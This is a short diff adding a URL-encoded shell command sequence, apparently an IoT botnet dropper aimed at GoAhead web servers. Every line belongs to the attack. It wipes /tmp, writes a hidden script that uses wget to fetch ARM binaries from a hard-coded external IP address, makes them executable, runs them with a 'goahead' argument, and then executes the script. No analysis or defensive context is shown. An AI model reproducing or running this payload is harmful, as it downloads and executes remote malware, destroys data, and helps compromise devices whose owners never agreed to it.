@@ -1,0 +1,9 @@
+rm+-rf+/tmp/*
+echo+-e+"cd+/tmp"+>+/tmp/.shinka
+echo+-e+"wget+http:/\/77.73.69.246/arm7"+>>+/tmp/.shinka
+echo+-e+"wget+http:/\/77.73.69.246/arm"+>>+/tmp/.shinka
+echo+-e+"chmod+777+/tmp/arm7"+>>+/tmp/.shinka
+echo+-e+"chmod+777+/tmp/arm"+>>+/tmp/.shinka
+echo+-e+"/tmp/arm7+goahead"+>>+/tmp/.shinka
+echo+-e+"/tmp/arm+goahead"+>>+/tmp/.shinka
+sh+/tmp/.shinka 
